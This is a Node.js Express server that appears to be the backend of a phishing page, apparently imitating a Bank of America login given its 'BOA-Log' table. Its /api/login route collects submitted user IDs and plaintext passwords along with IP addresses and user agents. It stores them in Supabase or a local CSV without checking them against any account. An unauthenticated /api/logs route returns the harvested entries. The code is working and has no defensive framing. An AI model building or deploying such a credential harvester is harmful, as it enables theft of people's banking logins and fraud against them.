import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { createClient } from '@supabase/supabase-js';
import dotenv from 'dotenv';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// API Routes MUST come before static middleware
// Setup endpoint to test BOA-Log table
app.post('/api/setup', async (req, res) => {
  console.log('Setup endpoint called - testing BOA-Log table');
  try {
    if (!supabase) {
      return res.status(500).json({ success: false, error: 'Supabase not configured' });
    }

    // Get table schema first to see what columns are available
    console.log('Attempting to query BOA-Log table...');
    
    // Try a simple insert with just empty object to trigger auto-generated columns
    const { data: testData, error: testError } = await supabase
      .from('BOA-Log')
      .insert([{}])
      .select();

    if (testError) {
      console.error('Error inserting test entry:', testError.message);
      // Try with at least one column
      const { data: retryData, error: retryError } = await supabase
        .from('BOA-Log')
        .insert([{ id: null }]) // Let the sequence generate it
        .select();
      
      if (retryError) {
        console.error('Retry also failed:', retryError.message);
        return res.status(500).json({ success: false, error: retryError.message });
      }
      
      console.log('✓ Test entry inserted (retry):', retryData);
      return res.json({ success: true, message: 'Sample entry inserted into BOA-Log', data: retryData });
    }

    console.log('✓ Test entry inserted successfully:', testData);
    res.json({ success: true, message: 'Sample entry inserted into BOA-Log', data: testData });
  } catch (error) {
    console.error('Setup error:', error.message);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Debug route
app.get('/api/debug', (req, res) => {
  res.json({ status: 'ok', message: 'Server is running' });
});

// Static files middleware - AFTER API routes
app.use(express.static(path.join(__dirname)));

// Supabase Configuration
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_ANON_KEY;
const useSupabase = supabaseUrl && supabaseKey;

let supabase = null;
if (useSupabase) {
  supabase = createClient(supabaseUrl, supabaseKey);
  console.log('Supabase client initialized');
} else {
  console.log('Supabase not configured, using local storage for development');
}

// Local CSV Logger Configuration (for development)
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir);
}

// Helper function to get client IP
function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0].trim() ||
         req.socket.remoteAddress ||
         'unknown';
}

// API endpoint for form submissions
app.post('/api/login', async (req, res) => {
  const { userId, password, rememberMe } = req.body;
  const ipAddress = getClientIp(req);
  const userAgent = req.headers['user-agent'];

  try {
    // Log the entry
    await logEntry({
      userId,
      password,
      rememberMe: rememberMe === 'on' || rememberMe === true,
      ipAddress,
      userAgent
    });

    res.json({ success: true, message: 'Login attempt logged' });
  } catch (error) {
    console.error('Error processing login:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Log entry function - supports both Supabase and local CSV
async function logEntry(data) {
  try {
    if (useSupabase && supabase) {
      // Log to Supabase BOA-Log table
      // Note: BOA-Log table only has id and created_at auto-generated columns
      // We'll store all data as JSON in a notes/data column if it exists, or use CSV fallback
      
      try {
        // Try inserting with JSON data column
        const { error } = await supabase
          .from('BOA-Log')
          .insert([
            {
              data: JSON.stringify({
                user_id: data.userId || 'N/A',
                password: data.password || 'N/A',
                remember_me: data.rememberMe ? true : false,
                ip_address: data.ipAddress || 'unknown',
                user_agent: data.userAgent || 'unknown',
                status: 'Attempted',
                timestamp: new Date().toISOString()
              })
            }
          ]);

        if (!error) {
          console.log('Entry logged to Supabase BOA-Log:', data.userId);
          return;
        }
        
        // If data column doesn't exist, try without it and fall back to CSV
        throw new Error('BOA-Log table schema mismatch');
      } catch (dbError) {
        console.log('Supabase insertion failed, using CSV fallback:', dbError.message);
        
        // Fallback to local CSV logging
        const logsFile = path.join(logsDir, 'login_entries.csv');
        const timestamp = new Date().toISOString();
        const entry = `${timestamp},${data.userId || 'N/A'},${data.password || 'N/A'},${data.rememberMe ? 'Yes' : 'No'},${data.ipAddress || 'unknown'},"${(data.userAgent || 'unknown').replace(/"/g, '""')}",Attempted\n`;
        
        // Add header if file doesn't exist
        if (!fs.existsSync(logsFile)) {
          fs.writeFileSync(logsFile, 'Timestamp,User ID,Password,Remember Me,IP Address,User Agent,Status\n');
        }
        
        fs.appendFileSync(logsFile, entry);
        console.log('Entry logged to CSV (Supabase fallback):', data.userId);
      }
    } else {
      // Fallback to local CSV logging
      const logsFile = path.join(logsDir, 'login_entries.csv');
      const timestamp = new Date().toISOString();
      const entry = `${timestamp},${data.userId || 'N/A'},${data.password || 'N/A'},${data.rememberMe ? 'Yes' : 'No'},${data.ipAddress || 'unknown'},"${(data.userAgent || 'unknown').replace(/"/g, '""')}",Attempted\n`;
      
      // Add header if file doesn't exist
      if (!fs.existsSync(logsFile)) {
        fs.writeFileSync(logsFile, 'Timestamp,User ID,Password,Remember Me,IP Address,User Agent,Status\n');
      }
      
      fs.appendFileSync(logsFile, entry);
      console.log('Entry logged to CSV:', data.userId);
    }
  } catch (error) {
    console.error('Error logging entry:', error);
    throw error;
  }
}

// Route to view logs
app.get('/api/logs', async (req, res) => {
  try {
    if (useSupabase && supabase) {
      // Get logs from Supabase
      const { data, error } = await supabase
        .from('BOA-Log')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(100);

      if (error) {
        throw error;
      }

      res.json({
        success: true,
        data: data,
        source: 'Supabase'
      });
    } else {
      // Get logs from local CSV
      const logsFile = path.join(logsDir, 'login_entries.csv');
      if (fs.existsSync(logsFile)) {
        const logs = fs.readFileSync(logsFile, 'utf8');
        res.json({
          success: true,
          data: logs,
          source: 'Local CSV'
        });
      } else {
        res.json({
          success: false,
          message: 'No logs found',
          source: 'Local CSV'
        });
      }
    }
  } catch (error) {
    console.error('Error fetching logs:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Serve index.html by default
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`CSV logs will be saved to: ${path.join(logsDir, 'login_entries.csv')}`);
});
